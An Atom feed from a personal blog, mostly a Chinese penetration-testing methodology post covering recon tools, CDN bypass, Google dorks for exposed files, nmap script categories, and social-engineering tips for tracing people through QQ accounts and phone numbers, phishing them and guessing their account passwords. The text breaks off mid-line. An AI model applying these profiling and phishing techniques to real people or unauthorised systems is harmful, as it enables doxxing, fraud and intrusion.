<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CCB</title>
  
  
  <link href="https://frankcao3.github.io/atom.xml" rel="self"/>
  
  <link href="https://frankcao3.github.io/"/>
  <updated>2023-10-06T09:09:05.969Z</updated>
  <id>https://frankcao3.github.io/</id>
  
  <author>
    <name>ccb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="https://frankcao3.github.io/posts/16107"/>
    <id>https://frankcao3.github.io/posts/16107</id>
    <published>2023-10-05T11:40:46.695Z</published>
    <updated>2023-10-06T09:09:05.969Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>渗透测试全流程</title>
    <link href="https://frankcao3.github.io/posts/34953"/>
    <id>https://frankcao3.github.io/posts/34953</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试全流程"><a href="#渗透测试全流程" class="headerlink" title="渗透测试全流程"></a>渗透测试全流程</h1><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/290055.html">https://www.freebuf.com/articles/web/290055.html</a></p><p><a href="https://www.freebuf.com/vuls/360173.html">https://www.freebuf.com/vuls/360173.html</a></p><p>从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是<strong>目录</strong>。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">dirbuster</span><br><span class="line">kali自带的一款工具，fuzz很方便</span><br><span class="line"></span><br><span class="line">gorailgun</span><br><span class="line">一款自动化做的非常好的工具，信息收集全过程都能用上</span><br><span class="line"></span><br><span class="line">OneForALL</span><br><span class="line">一款子域名收集工具，收集接口非常多，比自己收藏一大堆网址方便，收集子域自动去重，去无效，并进行拓展</span><br><span class="line"></span><br><span class="line">layer子域名挖掘机和subdomainbrute</span><br><span class="line">拉满线程去跑子域名的工具，都是老朋友见面，不用多说了</span><br><span class="line"></span><br><span class="line">一些信息收集的网站</span><br><span class="line">http://www.webscan.cc/                 C端同服扫描</span><br><span class="line">https://www.tianyancha.com/                 天眼查</span><br><span class="line">https://fofa.so/                   网络空间搜索引擎</span><br><span class="line">http://www.yunsee.cn/               云悉WEB资产搜集</span><br><span class="line">https://www.shodan.io/              shodan搜索引擎</span><br><span class="line">https://www.zoomeye.org/                知道创宇眼</span><br><span class="line">http://www.dianhua.cn/                     电话帮</span><br><span class="line">http://haoma.sogou.com/rz/              搜狗号码通</span><br><span class="line">http://haoma.baidu.com/query          百度号码认证</span><br><span class="line">http://www.gogoqq.com/          非好友情况如何查看QQ空间</span><br><span class="line">http://whitepages.com              房产登记信息查询</span><br><span class="line">http://tool.chinaz.com/                    站长之家</span><br><span class="line">http://www.webscan.cc/                     在线工具</span><br><span class="line">http://www.882667.com                 查询IP所在位置</span><br><span class="line">http://www.yunsee.cn         云悉在线WEB指纹CMS识别平台</span><br><span class="line">http://whatweb.bugscaner.com/look/         指纹识别</span><br><span class="line"></span><br><span class="line">临时邮箱</span><br><span class="line">https://temp-mail.org/zh/</span><br><span class="line">https://www.linshiyouxiang.net/</span><br><span class="line">https://www.guerrillamail.com/zh/</span><br><span class="line">https://www.moakt.com/zh</span><br><span class="line">http://links.icamtech.com/</span><br><span class="line"></span><br><span class="line">在线C段/同服(旁站)</span><br><span class="line">https://rapiddns.io/sameip</span><br><span class="line">http://www.webscan.cc/</span><br><span class="line">https://chapangzhan.com</span><br><span class="line">https://phpinfo.me/bing.php</span><br><span class="line"></span><br><span class="line">漏洞库</span><br><span class="line">https://www.cnvd.org.cn/</span><br><span class="line">https://www.securityfocus.com/</span><br><span class="line">https://packetstormsecurity.com/</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line">https://cxsecurity.com/</span><br><span class="line">https://shuimugan.com/</span><br><span class="line">http://0day.today/</span><br></pre></td></tr></table></figure><h3 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1. 目标确认"></a>1. 目标确认</h3><h4 id="1-1-域名注册信息"><a href="#1-1-域名注册信息" class="headerlink" title="1.1 域名注册信息"></a>1.1 域名注册信息</h4><p><strong>通过如下步骤确认目标所有者信息：</strong></p><p>Whois 目标域名&#x2F;主机名：whois <a href="http://example.com/">http://example.com</a><br>解析目标域名&#x2F;主机名的IP地址：dig +short <a href="http://example.com/">http://example.com</a><br>获取域名的详细解析过程：dig +trace <a href="http://example.com/">http://example.com</a><br>后续用于字典制作和进一步收集目标信息的基础</p><p><strong>获取真实IP：</strong></p><p>浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。</p><p><strong>验证是否存在CDN</strong></p><p>方法1：</p><p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><p>方法2：</p><p>试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.<br>nslookup <a href="http://example.com/">http://example.com</a></p><p>方法3:</p><p>在线工具查看是否存在CDN，可以参考以下站点:<br><a href="http://www.cdnplanet.com/tools/cdnfinder">http://www.cdnplanet.com/tools/cdnfinder</a><br><a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p><p>&#x3D;&#x3D;<strong>绕过CDN查找网站真实IP</strong>&#x3D;&#x3D;</p><p><strong>1. 查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)</strong></p><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a><br>非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。<br><a href="http://viewdns.info/">http://viewdns.info</a></p><p>同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。<br><a href="http://securitytrails.com/">http://securitytrails.com</a><br><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p>庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。<br><a href="http://iphostinfo.com/">http://iphostinfo.com</a><br>注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。</p><p><strong>2. 查询子域名</strong>（捷径，去众测平台、github找官方发布过的）</p><p>注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP<br>爆破子域名:</p><p><strong>主动式</strong></p><p>layer子域名挖掘机（字典要自己丰富）<br><a href="http://z.zcjun.com/(%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98)">http://z.zcjun.com/(在线子域名挖掘)</a><br>fuzzdomain 很好用，速度快</p><p><strong>被动式</strong></p><p>搜索引擎拿<strong>子域名、旁站（同IP网站）、C段</strong>：</p><p>可用搜索引擎语法查询子域名：<br>谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异</p><p>详细用法:<br>（1）site: &#x3D;主域名,搜索其主要域名下面的子域名<br>（2）allintext: &#x3D; 搜索文本,但不包括网页标题和链接<br>（3）allinlinks: &#x3D; 搜索链接, 不包括文本和标题。<br>（4）related:URL &#x3D; 列出于目标URL地址有关的网页。<br>（5）link:URL &#x3D; 列出到链接到目标URL的网页清单。<br>（6）使用“-”去掉不想看的结果，例如site:<a href="http://baidu.com/">http://baidu.com</a> <a href="http://-image.baidu.com/">http://-image.baidu.com</a></p><p>百度语法：<br><a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p><p>谷歌语法：<a href="https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187</a></p><p>GHDB：<br><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><p><strong>3. 资产搜索(旁站\C段\特征):</strong></p><p><a href="https://www.shodan.io(资产相关或特征值关键字爆ip)/">https://www.shodan.io(资产相关或特征值关键字爆ip)</a><br><a href="https://fofa.so/">https://fofa.so</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> （云悉在线资产平台)<br><a href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la</a> （查询啦）<br><a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://duckduckgo.com/">https://duckduckgo.com</a> （一个不会存储你个人信息的搜索引擎）<br><a href="https://crt.sh/%EF%BC%88SSL%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%EF%BC%89">https://crt.sh/（SSL证书查询）</a><br><a href="https://icp.aizhan.com/(%E5%9F%9F%E5%90%8D%E5%A4%87%E6%A1%88)">https://icp.aizhan.com/(域名备案)</a></p><p><strong>4. 对方服务器给自己发邮件暴露IP</strong></p><p><strong>5. 使用其他地区的服务器ping网站，当地可能没做CDN</strong></p><p><strong>6. 借助漏洞</strong></p><p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p><h4 id="1-2-DNS信息查询"><a href="#1-2-DNS信息查询" class="headerlink" title="1.2 DNS信息查询"></a>1.2 DNS信息查询</h4><p><strong>目的:</strong></p><p>注册者名称及邮箱,再反查其他域名<br>手机号 座机号<br>ASN号</p><p>地址在线DNS信息查询工具<br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> （DNS搜索引擎）<br><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a><br><a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br><a href="https://whois.west.cn/">https://whois.west.cn/</a><br><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> (站长之家)<br><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）<br><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> （国家企业信用信息系统）<br><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> （ICP备案查询）</p><h4 id="1-3-测试域传送漏洞"><a href="#1-3-测试域传送漏洞" class="headerlink" title="1.3 测试域传送漏洞"></a>1.3 测试域传送漏洞</h4><p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。<br>dnsrecon -d <a href="http://example.com/">http://example.com</a><br>dnsenum <a href="http://example.com/">http://example.com</a> 包含自动检测域传送漏洞<br>dnsenum还能爆破子域名，功能比较多，详见：<br><a href="https://blog.csdn.net/weixin_43263851/article/details/108955964">https://blog.csdn.net/weixin_43263851/article/details/108955964</a></p><h4 id="1-4-业务相关"><a href="#1-4-业务相关" class="headerlink" title="1.4 业务相关"></a>1.4 业务相关</h4><p>github泄露：<br>in:name test #仓库标题搜索含有关键字 SpringCloud<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字<br>stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字<br>forks:&gt;1000 test #forks数量大于1000的搜索关键字<br>forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字<br>size:&gt;&#x3D;5000 test #指定仓库大于5000k(5M)的搜索关键字<br>pushed:&gt;2019-02-12 test #发布时间大于 2019-02-12的搜索关键字<br>created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字<br>user:test #用户名搜素<br>license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字<br>language:java test #在java语言的代码中搜索关键字<br>user:test in:name test #组合搜索,用户名test的标题含有test的</p><p>网盘泄露：<br>各种云网盘，详见虫部落搜索:<br><a href="http://magnet.chongbuluo.com/">http://magnet.chongbuluo.com</a><br>敏感路径扫描：<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p><h3 id="2-OSINT-公开情报收集"><a href="#2-OSINT-公开情报收集" class="headerlink" title="2. OSINT 公开情报收集"></a>2. OSINT 公开情报收集</h3><h4 id="2-1-社工技巧"><a href="#2-1-社工技巧" class="headerlink" title="2.1 社工技巧"></a>2.1 社工技巧</h4><p><strong>查看注册的网站</strong>：0xreg reg007</p><p>知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息</p><p><strong>可以从这些方面判断用户是否注册过</strong></p><p>找回密码：输入账号，如果进入下一步了则该账号存在</p><p>登录：输入账号和密码，如果提示密码错误，则表示该用户已存在</p><p>注册：填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册</p><p><strong>知道QQ</strong></p><p>通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台<br>去腾讯\新浪微博搜索<br>通过微信搜索<br>查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)<br>通过说说、留言、日志找到其好友<br>加QQ钓鱼\共同好友\可能认识的人</p><p><strong>知道手机号</strong></p><p>搜索QQ、微信、钉钉等社交账号<br>在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号<br>查询支付宝、QQ交易账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)<br>通过对方的职业、兴趣找到该领域知名度较高的社交网站反查<br>根据在QQ空间、朋友圈等动态用百度识图识别照片<br>在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选</p><p><strong>留意社交动态</strong></p><p>发布时间线<br>使用什么客户端 iPhone Android还是浏览器<br>针对客户端预先制定exploit<br>注意每一条链接 &#x2F; 图片 &#x2F; 视频链接可能包含用户ID<br>图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征<br>视频也有可能有水印暴露社交账号ID,拍摄地点<br>从最早发布的动态看起，会有很大收获<br>一般得到一个账号的密码就相当于得到了其他账号的密码<br>一般人不同账号的用户名都是相同或相近的<br>一般人的社交账号头像用的都是一样的<br>尝试破解社保、公积金账号、身份z号（出生地、生日、星座、派出所代码）</p><p>虫部落快搜之文件搜索:<a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a></p><p>qq群、群文件、贴吧论坛、目标自用论坛等社交平台<strong>钓鱼</strong>和<strong>信息泄露</strong>(爬邮箱等信息)</p><p>电子邮件伪造、网络钓鱼<br>下载恶意程序<br>输入敏感信息</p><p>大部分信息可以用来生成密码字典</p><p>对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息</p><h4 id="2-2-搜索引擎OSINT"><a href="#2-2-搜索引擎OSINT" class="headerlink" title="2.2 搜索引擎OSINT"></a>2.2 搜索引擎OSINT</h4><p><strong>Google Hacking</strong>(baidu\bing\souhu\github)</p><p>GoogleHacking常用语法</p><p>1、<strong>intext</strong>：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件<br>2、<strong>intitle</strong>： 把网页标题中的某个字符作为搜索的条件<br>3、<strong>cache</strong>： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>4、<strong>filetype&#x2F;ext</strong>： 指定一个格式类型的文件作为搜索对象<br>5、<strong>inurl</strong>： 搜索包含指定字符的URL<br>6、<strong>site</strong>： 在指定的(域名)站点搜索相关内容　　</p><p>GoogleHacking其他语法</p><p>1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索<br>2、or 同时搜索两个或更多的关键字<br>3、link 搜索某个网站的链接 link:<a href="http://baidu.com即返回所有和baidu做了链接的url/">http://baidu.com即返回所有和baidu做了链接的URL</a><br>4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:<br>google-hacking-databaseGoogleHacking典型用法(<strong>特定资产的万能密码</strong>也要积累)</p><p>管理后台地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:http://target.com inurl:login | inurl:admin | inurl:manage</span><br><span class="line">| inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure><p>上传类漏洞地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:file</span><br><span class="line">site:http://target.com inurl:upload</span><br></pre></td></tr></table></figure><p>注入页面：（批量注入工具、结合搜索引擎）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:php?id=</span><br></pre></td></tr></table></figure><p>编辑器页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure><p>目录遍历漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intitle:index.of</span><br></pre></td></tr></table></figure><p>SQL错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure><p>phpinfo()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure><p>配置文件泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure><p>数据库文件泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure><p>日志文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.log</span><br></pre></td></tr></table></figure><p>备份和历史文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure><p>公开文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure><p>邮箱信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:@http://target.com</span><br><span class="line">site:http://target.com 邮件</span><br><span class="line">site:http://target.com email</span><br></pre></td></tr></table></figure><p>社工信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z</span><br></pre></td></tr></table></figure><h4 id="2-3-浏览器实用插件"><a href="#2-3-浏览器实用插件" class="headerlink" title="2.3 浏览器实用插件"></a>2.3 浏览器实用插件</h4><p>Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞</p><p>SwitchOmega：快捷切换代理</p><p>shodan：识别开放端口，主机服务等（被动信息搜集）</p><p>hacktools:综合插件,很强大</p><p>firefox渗透便携版version48,工具集成很多</p><p>注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用</p><h4 id="2-4-乌云和cnvd"><a href="#2-4-乌云和cnvd" class="headerlink" title="2.4 乌云和cnvd"></a>2.4 乌云和cnvd</h4><p>乌云库\乌云镜像\GHDB\CNVD等公开漏洞库</p><h3 id="3-x3D-x3D-打点-x3D-x3D"><a href="#3-x3D-x3D-打点-x3D-x3D" class="headerlink" title="3. &#x3D;&#x3D;打点&#x3D;&#x3D;"></a>3. &#x3D;&#x3D;打点&#x3D;&#x3D;</h3><p>打点方法</p><p>打点原理</p><h2 id="主动探测"><a href="#主动探测" class="headerlink" title="主动探测"></a>主动探测</h2><p>从管理员和用户的角度了解整个WEB应用乃至整个目标的全貌，主动探测会暴露ip以及留下日志信息，所以要…</p><h3 id="1-主动扫描"><a href="#1-主动扫描" class="headerlink" title="1. 主动扫描"></a>1. 主动扫描</h3><h4 id="1-1-常见服务漏洞（-x3D-x3D-nmap-x3D-x3D-）"><a href="#1-1-常见服务漏洞（-x3D-x3D-nmap-x3D-x3D-）" class="headerlink" title="1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）"></a>1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）</h4><p><strong>nmap</strong></p><p>功能包括脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF。</p><p>nmap脚本主要分为以下几类，在扫描时可根据需要设置</p><p>–script&#x3D;类别，这种方式进行比较笼统的扫描：</p><blockquote><p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http&#x2F;snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞<br>intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=auth 192.168.137.*</span><br><span class="line">负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line"></span><br><span class="line">nmap -n -p445 --script=broadcast 192.168.137.4</span><br><span class="line">在局域网内探查更多服务开启状况</span><br><span class="line"></span><br><span class="line">nmap --script=brute 192.168.137.*</span><br><span class="line">提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line"></span><br><span class="line">nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line">默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line"></span><br><span class="line">nmap --script=vuln 192.168.137.*</span><br><span class="line">检查是否存在常见漏洞</span><br><span class="line"></span><br><span class="line">nmap --script external 202.103.243.110</span><br><span class="line">利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line"></span><br><span class="line">nmap --script banner ip</span><br><span class="line">nmap -p port -sV ip</span><br><span class="line">获取软件版本信息</span><br><span class="line"></span><br><span class="line">nmap -O ip</span><br><span class="line">操作系统信息，版本</span><br><span class="line"></span><br><span class="line">nmap -A -v -sS -T2 ip</span><br><span 